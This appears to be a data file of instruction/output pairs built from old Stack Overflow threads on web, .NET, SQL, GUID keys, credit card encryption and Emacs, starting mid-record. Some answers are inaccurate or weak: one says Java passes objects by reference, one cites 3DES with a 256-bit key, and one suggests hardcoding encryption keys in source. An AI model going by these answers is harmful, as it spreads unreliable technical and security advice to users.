Dog(\"Boxer\"))."}
{"instruction": "Both the jQuery and Prototpye JavaScript libraries refuse to allow me to use a variable to select an list item element by index number although they accept a hard coded number. \nFor example, in Prototype this works:\n$$('li')[5].addClassName('active');\n\nBut this will not work no matter how I try to cast the variable as a number or integer:\n$$('li')[currentPage].addClassName('active');\n\nIn jQuery I get similar weirdness. This will work:\njQuery('li').eq(5).addClass(\"active\");\n\nBut this will not work again even though the value of currentPage is 5 and its type is number:\njQuery('li').eq(currentPage).addClass(\"active\");\n\nI'm trying to create a JavaScript pagination system and I need to set the class on the active page button. The list item elements are created dynamically depending upon the number of pages I need.", "output": "Are you certain that currentPage is an integer? Try something like:\nvar currentPage = 5;\njQuery('li').eq(currentPage);\n\nas a simple sanity check. If that works, you should try casting to Integer."}
{"instruction": "Trying to find some simple SQL Server PIVOT examples.  Most of the examples that I have found involve counting or summing up numbers.  I just want to pivot some string data.  For example, I have a query returning the following.\nAction1 VIEW  \nAction1 EDIT  \nAction2 VIEW  \nAction3 VIEW  \nAction3 EDIT  \n\nI would like to use PIVOT (if even possible) to make the results like so:\nAction1 VIEW EDIT  \nAction2 VIEW NULL  \nAction3 VIEW EDIT  \n\nIs this even possible with the PIVOT functionality?", "output": "If you specifically want to use the SQL Server PIVOT function, then this should work, assuming your two original columns are called act and cmd. (Not that pretty to look at though.)\nSELECT act AS 'Action', [View] as 'View', [Edit] as 'Edit'\nFROM (\n    SELECT act, cmd FROM data\n) AS src\nPIVOT (\n    MAX(cmd) FOR cmd IN ([View], [Edit])\n) AS pvt"}
{"instruction": "Both the jQuery and Prototpye JavaScript libraries refuse to allow me to use a variable to select an list item element by index number although they accept a hard coded number. \nFor example, in Prototype this works:\n$$('li')[5].addClassName('active');\n\nBut this will not work no matter how I try to cast the variable as a number or integer:\n$$('li')[currentPage].addClassName('active');\n\nIn jQuery I get similar weirdness. This will work:\njQuery('li').eq(5).addClass(\"active\");\n\nBut this will not work again even though the value of currentPage is 5 and its type is number:\njQuery('li').eq(currentPage).addClass(\"active\");\n\nI'm trying to create a JavaScript pagination system and I need to set the class on the active page button. The list item elements are created dynamically depending upon the number of pages I need.", "output": "Make sure that the currentPage variable is correctly scoped in the code where it is being accessed. Could the variable be changed somewhere else in the code before you are accessing it? Tools like Firebug can help you to add a breakpoint at the point of execution and see the value of your variable."}
{"instruction": "I always thought Java was pass-by-reference; however I've seen a couple of blog posts (for example, this blog) that claim it's not. I don't think I understand the distinction they're making. \nWhat is the explanation?", "output": "To make a long story short, Java objects have some very peculiar properties.\nIn general, Java has primitive types (int, bool, char, double, etc) that are passed directly by value. Then Java has objects (everything that derives from java.lang.Object). Objects are actually always handled through a reference (a reference being a pointer that you can't touch). That means that in effect, objects are passed by reference, as the references are normally not interesting. It does however mean that you cannot change which object is pointed to as the reference itself is passed by value.\nDoes this sound strange and confusing? Let's consider how C implements pass by reference and pass by value. In C, the default convention is pass by value. void foo(int x) passes an int by value. void foo(int *x) is a function that does not want an int a, but a pointer to an int: foo(&a). One would use this with the & operator to pass a variable address.\nTake this to C++, and we have references. References are basically (in this context) syntactic sugar that hide the pointer part of the equation: void foo(int &x) is called by foo(a), where the compiler itself knows that it is a reference and the address of the non-reference a should be passed. In Java, all variables referring to objects are actually of reference type, in effect forcing call by reference for most intends and purposes without the fine grained control (and complexity) afforded by, for example, C++."}
{"instruction": "I need to be able to get at the full URL of the page I am on from a user control.  Is it just a matter of concatenating a bunch of Request variables together?  If so which ones? Or is there a more simpiler way?", "output": "if you need the full URL as everything from the http to the querystring you will need to concatenate the following variables\nRequest.ServerVariables(\"HTTPS\") // to check if it's HTTP or HTTPS\nRequest.ServerVariables(\"SERVER_NAME\") \nRequest.ServerVariables(\"SCRIPT_NAME\") \nRequest.ServerVariables(\"QUERY_STRING\")"}
{"instruction": "I need to be able to get at the full URL of the page I am on from a user control.  Is it just a matter of concatenating a bunch of Request variables together?  If so which ones? Or is there a more simpiler way?", "output": "Thanks guys, I used a combination of both your answers @Christian and @Jonathan for my specific need.\n\"http://\" + Request.ServerVariables[\"SERVER_NAME\"] +  Request.RawUrl.ToString()\n\nI don't need to worry about secure http, needed the servername variable and the RawUrl handles the path from the domain name and includes the querystring if present."}
{"instruction": "How do you give a C# Auto-Property a default value?  I either use the constructor, or revert to the old syntax. \n Using the Constructor:\nclass Person \n{\n    public Person()\n    {\n        Name = \"Default Name\";\n    }\n    public string Name { get; set; }\n}\n\nUsing normal property syntax  (with a default value)\nprivate string name = \"Default Name\";\npublic string Name \n{\n    get \n    {\n        return name;\n    }\n    set\n    {\n        name = value;\n    }\n}\n\nIs there a better way?", "output": "Have you tried using the DefaultValueAttribute or ShouldSerialize and Reset methods in conjunction with the constructor?  I feel like one of these two methods is necessary if you're making a class that might show up on the designer surface or in a property grid."}
{"instruction": "How do you give a C# Auto-Property a default value?  I either use the constructor, or revert to the old syntax. \n Using the Constructor:\nclass Person \n{\n    public Person()\n    {\n        Name = \"Default Name\";\n    }\n    public string Name { get; set; }\n}\n\nUsing normal property syntax  (with a default value)\nprivate string name = \"Default Name\";\npublic string Name \n{\n    get \n    {\n        return name;\n    }\n    set\n    {\n        name = value;\n    }\n}\n\nIs there a better way?", "output": "In C# 5 and earlier, to give auto implemented properties a default value, you have to do it in a constructor.\nThe ability to have auto property initializers is included since C# 6.0. The syntax is:\npublic int X { get; set; } = x; // C# 6 or higher"}
{"instruction": "Is there any way to save an object using Hibernate if there is already an object using that identifier loaded into the session?\n\nDoing session.contains(obj) seems to only return true if the session contains that exact object, not another object with the same ID.\nUsing merge(obj) throws an exception if the object is new", "output": "How about:\nsession.replicate(entity, ReplicationMode.OVERWRITE);\n\n?"}
{"instruction": "Both the jQuery and Prototpye JavaScript libraries refuse to allow me to use a variable to select an list item element by index number although they accept a hard coded number. \nFor example, in Prototype this works:\n$$('li')[5].addClassName('active');\n\nBut this will not work no matter how I try to cast the variable as a number or integer:\n$$('li')[currentPage].addClassName('active');\n\nIn jQuery I get similar weirdness. This will work:\njQuery('li').eq(5).addClass(\"active\");\n\nBut this will not work again even though the value of currentPage is 5 and its type is number:\njQuery('li').eq(currentPage).addClass(\"active\");\n\nI'm trying to create a JavaScript pagination system and I need to set the class on the active page button. The list item elements are created dynamically depending upon the number of pages I need.", "output": "It looks like I just needed to be more specific in my element selector although it is weird that a hard coded number would work.\njQuery('#pagination-digg li').eq(currentPage).addClass(\"active\");"}
{"instruction": "How do you give a C# Auto-Property a default value?  I either use the constructor, or revert to the old syntax. \n Using the Constructor:\nclass Person \n{\n    public Person()\n    {\n        Name = \"Default Name\";\n    }\n    public string Name { get; set; }\n}\n\nUsing normal property syntax  (with a default value)\nprivate string name = \"Default Name\";\npublic string Name \n{\n    get \n    {\n        return name;\n    }\n    set\n    {\n        name = value;\n    }\n}\n\nIs there a better way?", "output": "DefaultValueAttribute ONLY work in the vs designer. It will not initialize the property to that value. \nSee DefaultValue attribute is not working with my Auto Property"}
{"instruction": "I have a custom installer action that updates the PATH environment, and creates an additional environment variable. Appending a directory to the existing path variable is working fine, but for some reason my attempts to create a new environment variable have been unsuccessful. The code I am using is:\n        using (RegistryKey reg = Registry.LocalMachine.OpenSubKey(@\"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\", true))\n        {\n            reg.SetValue(\"MYVAR\", \"SomeVal\", RegistryValueKind.ExpandString);\n        }\n\nEdit: The OS is 32-bit XP, and as far as I can tell it is failing silently.", "output": "What OS is this? Is it on a 64-bit system?  What is the nature of the failure: silent or is an exception thrown?\nYou could try running ProcessMonitor and seeing if it sees the attempt to set the value."}
{"instruction": "I have a custom installer action that updates the PATH environment, and creates an additional environment variable. Appending a directory to the existing path variable is working fine, but for some reason my attempts to create a new environment variable have been unsuccessful. The code I am using is:\n        using (RegistryKey reg = Registry.LocalMachine.OpenSubKey(@\"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\", true))\n        {\n            reg.SetValue(\"MYVAR\", \"SomeVal\", RegistryValueKind.ExpandString);\n        }\n\nEdit: The OS is 32-bit XP, and as far as I can tell it is failing silently.", "output": "Is there any reason that you have to do it through the registry?\nIf not, you can use Environment.SetEnvironmentVariable() since .NET 2.0. It allows you to set on a machine, process or user basis."}
{"instruction": "How do you give a C# Auto-Property a default value?  I either use the constructor, or revert to the old syntax. \n Using the Constructor:\nclass Person \n{\n    public Person()\n    {\n        Name = \"Default Name\";\n    }\n    public string Name { get; set; }\n}\n\nUsing normal property syntax  (with a default value)\nprivate string name = \"Default Name\";\npublic string Name \n{\n    get \n    {\n        return name;\n    }\n    set\n    {\n        name = value;\n    }\n}\n\nIs there a better way?", "output": "Sometimes I use this, if I don't want it to be actually set and persisted in my db:\nclass Person\n{\n    private string _name; \n    public string Name \n    { \n        get \n        {\n            return string.IsNullOrEmpty(_name) ? \"Default Name\" : _name;\n        } \n\n        set { _name = value; } \n    }\n}\n\nObviously if it's not a string then I might make the object nullable ( double?, int? ) and check if it's null, return a default, or return the value it's set to.\nThen I can make a check in my repository to see if it's my default and not persist, or make a backdoor check in to see the true status of the backing value, before saving.\nHope that helps!"}
{"instruction": "I want to use the  MultipleLookupField control in a web page that will run in the context of SharePoint. I was wondering if anyone would help me with an example, which shows step by step how to use the control two display two SPField Collections.", "output": "I'm not entirely sure I understand your question, especially the bit about displaying two SPField collections. Sorry if this turns out to be the answer to a completely different question!\nAnyway here's a quick demo walkthrough of using the MultipleLookupField in a web part.\nCreate a team site. Add a few tasks to the task list. Also put a document in the Shared Documents library. Create a new column in the Shared Documents library; call it \"Related\", have it be a Lookup into the Title field of the Tasks list, and allow multiple values.\nNow create a web part, do all the usual boilerplate and then add this:\nLabel l;\nMultipleLookupField mlf;\n\nprotected override void CreateChildControls()\n{\n    base.CreateChildControls();\n    SPList list = SPContext.Current.Web.Lists[\"Shared Documents\"];\n    if (list != null && list.Items.Count > 0)\n    {\n        LiteralControl lit = new LiteralControl(\"Associate tasks to \" + \n                             list.Items[0].Name);\n        this.Controls.Add(lit);\n\n        mlf = new MultipleLookupField();\n        mlf.ControlMode = SPControlMode.Edit;\n        mlf.FieldName = \"Related\";\n        mlf.ItemId = list.Items[0].ID;\n        mlf.ListId = list.ID;\n        mlf.ID = \"Related\";\n        this.Controls.Add(mlf);\n\n        Button b = new Button();\n        b.Text = \"Change\";\n        b.Click += new EventHandler(bClick);\n        this.Controls.Add(b);\n\n        l = new Label();\n        this.Controls.Add(l);\n    }\n\n}\n\nvoid bClick(object sender, EventArgs e)\n{\n    l.Text = \"\";\n    foreach (SPFieldLookupValue val in (SPFieldLookupValueCollection)mlf.Value)\n    {\n        l.Text += val.LookupValue.ToString() + \" \";\n    }\n    SPListItem listitem = mlf.List.Items[0];\n    listitem[\"Related\"] = mlf.Value;\n    listitem.Update();\n    mlf.Value = listitem[\"Related\"];\n}\n\nprotected override void OnInit(EventArgs e)\n{\n    base.OnInit(e);\n    EnsureChildControls();\n}\n\nGranted, this is borderline ridiculous -- everything is hard-coded, there is no error-handling at all, and it serves no useful purpose -- but it's only meant as a quick demo. Now build and deploy this web part and add an instance of it to your team site's homepage; it should allow you to get and set the tasks which are associated with the first document in the library.\nThe strange bit towards the end of the button Click handler, where we read a value from mlf.Value and then write it back again, appears to be required if you want the UI to stay in sync with the actual list values. Try omitting the last line of bClick to see what I mean. This has been driving me nuts for the last hour or so, and I'm hoping another commenter can come up with a better approach..."}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "@SqlMenace\n\n\nThere are other problems with GUIDs, you see GUIDs are not sequential, so inserts will be scattered all over the place, this causes page splits and index fragmentation\n\n\nNot true. Primary key != clustered index.\nIf the clustered index is another column (\"inserted_on\" springs to mind) then the inserts will be sequential and no page splits or excessive fragmentation will occur."}
{"instruction": "I usually store my connectionstring in web.config or in the application settings of my Visual Studio project. The application I'm currently working on makes a lot of trips to the database which means it will look up the connectionstring every time. Should I be putting the connectionstring in the cache or should I be looking at storing the whole SqlConnection object in the cache to eliminate the need to open and close them all the time?\nUpdate: Seems like the consensus is to store the connection string in a configuration file and leave the caching in the trusting hand of ADO.NET", "output": "Keep it in a configuration file.  Use a robust data access strategy provided by tools like NHibernate or Linq to Sql."}
{"instruction": "I usually store my connectionstring in web.config or in the application settings of my Visual Studio project. The application I'm currently working on makes a lot of trips to the database which means it will look up the connectionstring every time. Should I be putting the connectionstring in the cache or should I be looking at storing the whole SqlConnection object in the cache to eliminate the need to open and close them all the time?\nUpdate: Seems like the consensus is to store the connection string in a configuration file and leave the caching in the trusting hand of ADO.NET", "output": "From what I can recall the contents of the .config file are held in memory anyway... I'll get back to you.  \nEdit: What HE said"}
{"instruction": "I usually store my connectionstring in web.config or in the application settings of my Visual Studio project. The application I'm currently working on makes a lot of trips to the database which means it will look up the connectionstring every time. Should I be putting the connectionstring in the cache or should I be looking at storing the whole SqlConnection object in the cache to eliminate the need to open and close them all the time?\nUpdate: Seems like the consensus is to store the connection string in a configuration file and leave the caching in the trusting hand of ADO.NET", "output": "I wouldn't cache the connection object, that will defeat the built-in connection pooling -- ADO.NET will handle connections (assuming you instantiate and close them) efficiently by itself.\nAs far as the connection string itself, you shouldn't need to cache it if you load it from connection -- the connection manager object in the .NET 2.0 framework loads the config into memory when you first access it, so there are no repeat trips to the file system."}
{"instruction": "I usually store my connectionstring in web.config or in the application settings of my Visual Studio project. The application I'm currently working on makes a lot of trips to the database which means it will look up the connectionstring every time. Should I be putting the connectionstring in the cache or should I be looking at storing the whole SqlConnection object in the cache to eliminate the need to open and close them all the time?\nUpdate: Seems like the consensus is to store the connection string in a configuration file and leave the caching in the trusting hand of ADO.NET", "output": "I usually cache the connection string in a global configuration object in my application.  This value is loaded up at the beginning of program execution from where ever it is stored -- file, encrypted file, config file, etc.  ADO.NET is very good at caching connection objects to the database so I would not cache the SqlConnection object."}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "You're correct that this is an old problem, and it has two canonical solutions:\n\nUse unique identifiers as the primary key. Note that if you're concerned about readability you can roll your own unique identifier instead of using a GUID. A unique identifier will use information about the date and the machine to generate a unique value. \nUse a composite key of 'Actor' + identifier. Every user gets a numeric actor ID, and the keys of newly inserted rows use the actor ID as well as the next available identifier. So if two actors both insert a new row with ID \"100\", the primary key constraint will not be violated.\n\nPersonally, I prefer the first approach, as I think composite keys are really tedious as foreign keys. I think the human readability complaint is overstated -- end-users shouldn't have to know anything about your keys, anyways!"}
{"instruction": "I usually store my connectionstring in web.config or in the application settings of my Visual Studio project. The application I'm currently working on makes a lot of trips to the database which means it will look up the connectionstring every time. Should I be putting the connectionstring in the cache or should I be looking at storing the whole SqlConnection object in the cache to eliminate the need to open and close them all the time?\nUpdate: Seems like the consensus is to store the connection string in a configuration file and leave the caching in the trusting hand of ADO.NET", "output": "The web.config is cached.  But even if it wasn't, don't forget that ado.net maintains a connection pool - its not opening a new connection every time you make a call to the db."}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "@Portman  By default PK ==  Clustered Index, creating a primary key constraint will automatically create a clustered index, you need to specify non clustered if you don't want it clustered."}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "Make sure to utilize guid.comb - takes care of the indexing stuff.  If you are dealing with performance issues after that then you will be, in short order, an expert on scaling.\nAnother reason to use GUIDs is to enable database refactoring.  Say you decide to apply polymorphism or inheritance or whatever to your Customers entity.  You now want Customers and Employees to derive from Person and have them share a table.  Having really unique identifiers makes data migration simple.  There are no sequences or integer identity fields to fight with."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Whitespace\n\n   \t.\n .\n \t.\n\t\t.\n  \t.\n   \t.\n\t\t\t .\n .\n\t \t .\n\t  .\n   \t.\n .\n  .\n \t\t\t .\n\t\t  \t\t\t .\n .\n\t.\n.\n  \t .\n .\n.\n\t.\n \t.\n.\n.\n.\n\nIt was hard to get it to show here properly, but now I tried copying it from the preview and it works. You need to input the number and press enter."}
{"instruction": "How do you give a C# Auto-Property a default value?  I either use the constructor, or revert to the old syntax. \n Using the Constructor:\nclass Person \n{\n    public Person()\n    {\n        Name = \"Default Name\";\n    }\n    public string Name { get; set; }\n}\n\nUsing normal property syntax  (with a default value)\nprivate string name = \"Default Name\";\npublic string Name \n{\n    get \n    {\n        return name;\n    }\n    set\n    {\n        name = value;\n    }\n}\n\nIs there a better way?", "output": "Personally, I don't see the point of making it a property at all if you're not going to do  anything at all beyond the auto-property.  Just leave it as a field.  The encapsulation benefit for these item are just red herrings, because there's nothing behind them to encapsulate.  If you ever need to change the underlying implementation you're still free to refactor them as properties without breaking any dependent code.\nHmm... maybe this will be the subject of it's own question later"}
{"instruction": "I need to be able to get at the full URL of the page I am on from a user control.  Is it just a matter of concatenating a bunch of Request variables together?  If so which ones? Or is there a more simpiler way?", "output": "I usually use Request.Url.ToString() to get the full url (including querystring), no concatenation required."}
{"instruction": "I need to be able to get at the full URL of the page I am on from a user control.  Is it just a matter of concatenating a bunch of Request variables together?  If so which ones? Or is there a more simpiler way?", "output": "Request.Url.AbsoluteUri\n\nThis property does everything you need, all in one susinct call."}
{"instruction": "The .NET System.Security.Cryptography namespace has a rather bewildering collection of algorithms that I could use for encryption of credit card details. Which is the best?\nIt clearly needs to be secure for a relatively short string. \nEDIT: I'm in the UK, where I understand we're OK storing encrypted credit card details so long as the three-digit CVV number is never stored. And thanks all for the great responses.", "output": "3des is pretty good, store the salt along side, and keep a standard key somewhere not in the database or a config file. That way if you get pwned, they can't decrypt it."}
{"instruction": "The .NET System.Security.Cryptography namespace has a rather bewildering collection of algorithms that I could use for encryption of credit card details. Which is the best?\nIt clearly needs to be secure for a relatively short string. \nEDIT: I'm in the UK, where I understand we're OK storing encrypted credit card details so long as the three-digit CVV number is never stored. And thanks all for the great responses.", "output": "No offense, but the question is a little \"misguided\". There is no \"silver bullet\" solution. I would recommend to read up on cryptography in general and then do some threat modeling. Some questions (by no means a comprehensive list) you should ask yourself:\n\nIs the module doing the encryption the one which needs to decrypt it (in this case use symmetric crypto) or will it send data to an other module (on an other machine) which will use it (in which case you should consider public-key crypto)\nWhat do you want to protect against? Someone accessing the database but not having the sourcecode (in which case you can hardcode the encryption key directly into the source)? Someone sniffing your local network (you should consider transparent solutions like IPSec)? Someone stealing your server (it can happen even in data centers - in which case full disk encryption should be considered)?\nDo you really need to keep the data? Can't you directly pass it to the credit card processor and erase it after you get the confirmation? Can't you store it locally at the client in a cookie or Flash LSO? If you store it at the client, make sure that you encrypt it at the server side before putting it in a cookie. Also, if you are using cookies, make sure that you make them http only.\nIs it enough to compare the equality of the data (ie the data that the client has given me is the same data that I have)? If so, consider storing a hash of it. Because credit card numbers are relatively short and use a reduced set of symbols, a unique salt should be generated for each before hashing.\n\nLater edit: note that standard encryption algorithms from the same category (for example 3DES and AES - both being symmetric block cyphers) are of comparable strength. Most (commercial) systems are not broken because somebody bruteforced their encryption, but because their threat modelling was not detailed enough (or flat out they didn't have any). For example you can encrypt all the data, but if you happen to have a public facing web interface which is vulnerable to SQL injection, it won't help you much."}
{"instruction": "The .NET System.Security.Cryptography namespace has a rather bewildering collection of algorithms that I could use for encryption of credit card details. Which is the best?\nIt clearly needs to be secure for a relatively short string. \nEDIT: I'm in the UK, where I understand we're OK storing encrypted credit card details so long as the three-digit CVV number is never stored. And thanks all for the great responses.", "output": "As per PCI DSS compliance rules, any industry leading encryption standard is enough. So a 3DES with a 256 bit key is good enough (although other standards can be used). Check this out http://pcianswers.com/2006/08/09/methods-of-encrypting-data/"}
{"instruction": "A Little Background Information:\nI've been looking at a few PHP framework recently, and it came down to two. The Zend Framework or CodeIgniter. \nI prefer CodeIgniter, because of its simple design. It's very bare bone, and it is just kept simple. The thing I don't like though is the weak template system. The template system is important for me, because I will be working with another designer. Being able to give him a good template system is a big plus.\nZend was the second choice, because of the better template system that is built in. Zend is a different beast though compared to CodeIgniter. It emphasis \"loose coupling between modules\", but is a bigger framework. I don't like to feel like I have many things running under the hood that I never use. That is unnecessary overhead in my opinion, so I thought about putting a template system into CodeIgniter: Smarty.\nQuestion(s): How easy/hard is the process to integrate Smarty into CodeIgniter? From my initial scan of the CodeIgniter documentation, I can see that the layout of the framework is easy enough to understand, and I anticipate no problems. I want to know if anyone has used it before, and therefore are aware of any \"gotchas\" you my have experienced that is going to make this harder than it should be or impossible to pull off. I also want to know if this is a good thing to do at all. Is the template system in CodeIgniter enough for normal use? Are there any other template modules that are good for CodeIgniter aside from Smarty? I better off with Zend Framework? Is any wheel being invented here? Thank you for your help!", "output": "I did a quick google search and found the following:\nhttp://devcha.blogspot.com/2007/12/smarty-as-template-engine-in-code.html\nhttp://codeigniter.com/forums/viewthread/67127/\nIf the designer is not familiar with Smarty, I think it's almost the same as if you use the existing CodeIgniter templating system (which leaves everything to PHP actually). It also depends on the complexity of the project at hand.\nYou can also hook Smarty with Zend Framework. It's more complex than with CodeIgniter, but there's already a primer on how to do exactly that in the ZF documentation. http://framework.zend.com/manual/en/zend.view.scripts.html  Plus lots of tutorials on the net.\nIn my opinion it's almost the same, you can use pure PHP or Smarty as your template \"engine\", so it depends on the project. Also, compare a developer who has extensive experience and already has a library of view helpers so she uses pure PHP, versus a designer who doesn't know anything about PHP, but has extensive experience with Smarty. Sometimes decisions have to be based on who is going to do what."}
{"instruction": "How do you run Emacs in Windows?\nWhat is the best flavor of Emacs to use in Windows, and where can I download it? And where is the .emacs file located?", "output": "Well, I personally really like what I have been using since I started with Emacs, which is GNU Emacs.  It looks like it is built for windows too.  That link also answers your .emacs file question.  Here is a place you can download it.  You should probably get version 22.2 (the latest).\nIf this is your first time, I hope you enjoy it!  I know I absolutely love emacs!"}
{"instruction": "How do you run Emacs in Windows?\nWhat is the best flavor of Emacs to use in Windows, and where can I download it? And where is the .emacs file located?", "output": "See http://www.gnu.org/software/emacs/windows/ntemacs.html. Section 2.1 describes where to get it, and section 3.5 describes where the .emacs file goes (by default, in your home directory, as specified by the HOME environment variable)."}
{"instruction": "I have a file which is an XML representation of some data that is taken from a Web service and cached locally within a Web Application. The idea being is that this data is very static, but just might change. So I have set it up to cache to a file, and stuck a monitor against it to check if it has been deleted. Once deleted, the file will be refreshed from its source and rebuilt.\nI am now running in to problems though, because obviously in a multi-threaded environment it falls over as it is trying to access the data when it is still reading/writing the file.\nThis is confusing me, because I added a object to lock against, and this is always locked during read/write. It was my understanding that attempted access from other threads would be told to \"wait\" until the lock was released?\nJust to let you know, I am real new to multi-threaded development, so I am totally willing to accept this is a screw up on my part :)\n\nAm I missing something?\nWhat is the best file access strategy in a multi-threaded environment?\n\n\nEdit\nSorry - I should have said this is using ASP.NET 2.0 :)", "output": "If you're locking on a object stored as a static then the lock should work for all threads in the same Application Domain, but perhaps you need to upload a code sample so we can have a look at the offending lines.\nThat said, one thought would be to check if IIS is configured to run in Web Garden mode (i.e. more than 1 process executing your application) which would break your locking logic. While you could fix such a situation with a mutex it'd be easier to reconfigure your application to execute in a single process, although you'd be wise to check the performance before and after messing with the web garden settings as it can potentially affect performance."}
{"instruction": "How do you run Emacs in Windows?\nWhat is the best flavor of Emacs to use in Windows, and where can I download it? And where is the .emacs file located?", "output": "Note that GNU Emacs for Windows comes with two executables to start Emacs: \"emacs.exe\" and \"runemacs.exe\". The former keeps a DOS-Prompt window in the background, while the latter does not, so when if you choose that distribution and want to create a shortcut, be sure to launch \"runemacs.exe\".\nCarl"}
{"instruction": "I just wonder what the best approach is to have multiple users work on a Project in Visual Studio 2005 Professional.\nWe got a Solution with multiple Class Libraries, but when everyone opens the solution, we keep getting the \"X was modified, Reload/Discard?\" prompt all the time. Just opening one project is an obvious alternative, but I find it harder to use as you can't just see some of the other classes in other projects that way.\nAre there any Guidelines for Team Development with VS2005 Pro?\nEdit: Thanks. The current environment is a bit limited in the sense there is only 1 PC with RDP Connection, but that will change in the future. Marking the first answer as Accepted, but they are all good :)", "output": "Use source control to keep a central repository of all your code. Then each user checks out their own copy of the source code and works locally. Then submits only the code that changed.\nhttp://en.wikipedia.org/wiki/Revision_control"}
{"instruction": "I just wonder what the best approach is to have multiple users work on a Project in Visual Studio 2005 Professional.\nWe got a Solution with multiple Class Libraries, but when everyone opens the solution, we keep getting the \"X was modified, Reload/Discard?\" prompt all the time. Just opening one project is an obvious alternative, but I find it harder to use as you can't just see some of the other classes in other projects that way.\nAre there any Guidelines for Team Development with VS2005 Pro?\nEdit: Thanks. The current environment is a bit limited in the sense there is only 1 PC with RDP Connection, but that will change in the future. Marking the first answer as Accepted, but they are all good :)", "output": "What you need is source control.\nYou should definitely not open the same files over the network on multiple machines. For one thing, Visual Studio has safeguards in place to prevent you from modifying certain files during a build, but it has none of that that will prevent others from modifying the same files over the network.\nBy setting up source control, each developer will have a separate copy of the files locally on his or her developer machine, and periodically communicate with the source control system to check in/commit changes. After that, other developers can ask for the latest updates when they're ready to retrieve them."}
{"instruction": "I just wonder what the best approach is to have multiple users work on a Project in Visual Studio 2005 Professional.\nWe got a Solution with multiple Class Libraries, but when everyone opens the solution, we keep getting the \"X was modified, Reload/Discard?\" prompt all the time. Just opening one project is an obvious alternative, but I find it harder to use as you can't just see some of the other classes in other projects that way.\nAre there any Guidelines for Team Development with VS2005 Pro?\nEdit: Thanks. The current environment is a bit limited in the sense there is only 1 PC with RDP Connection, but that will change in the future. Marking the first answer as Accepted, but they are all good :)", "output": "This might sound snide, but if you're opening up the solution from a shared location then you're doing something wrong. If that's the case then you should start using source control (something like Subversion) and have everyone check out a copy of the project to work on. \nHowever if you're already using source control, then it might be a symptom of having the wrong things checked in. I find that you only need the sln, and the vcproj under source control.\nOtherwise I don't know..."}
{"instruction": "I just wonder what the best approach is to have multiple users work on a Project in Visual Studio 2005 Professional.\nWe got a Solution with multiple Class Libraries, but when everyone opens the solution, we keep getting the \"X was modified, Reload/Discard?\" prompt all the time. Just opening one project is an obvious alternative, but I find it harder to use as you can't just see some of the other classes in other projects that way.\nAre there any Guidelines for Team Development with VS2005 Pro?\nEdit: Thanks. The current environment is a bit limited in the sense there is only 1 PC with RDP Connection, but that will change in the future. Marking the first answer as Accepted, but they are all good :)", "output": "You should definitely, definitely be working with source control!\nThis will help stop the collisions that are occurring. Also, if you are making changes to the shared projects this often that it is a problem, then also ensure that all code is tested before getting checked in (otherwise they may bust someone else's build), but make sure they check in often (or time gained from not dealing with prompts will be lost in merging conflicts) :)"}
{"instruction": "How do you run Emacs in Windows?\nWhat is the best flavor of Emacs to use in Windows, and where can I download it? And where is the .emacs file located?", "output": "To access the .emacs file for your profile the easiest way is to open up emacs. Then do C-x C-, type in ~USERNAME/.emacs (or you can use init.el or one of the other flavours). Type your stuff into the file and C-x C-s (I think) to save it.\nThe actual file is located (in Windows XP) in c:\\Documents and Settings\\USERNAME.emacs.d(whatever you named the file), or the equivalent spelling/location on your system."}
{"instruction": "How do you run Emacs in Windows?\nWhat is the best flavor of Emacs to use in Windows, and where can I download it? And where is the .emacs file located?", "output": "I've run both GNU emacs and Xemacs on windows. I used to use it as my primary editor, email client etc, but not it's \"just\" an editor. \nWhen I recently reinstalled to Vista I installed the latest GNU version. It works fine. So does Xemacs, but it does look like GNU have got their sh*t together so Xemacs isn't as compelling anymore."}
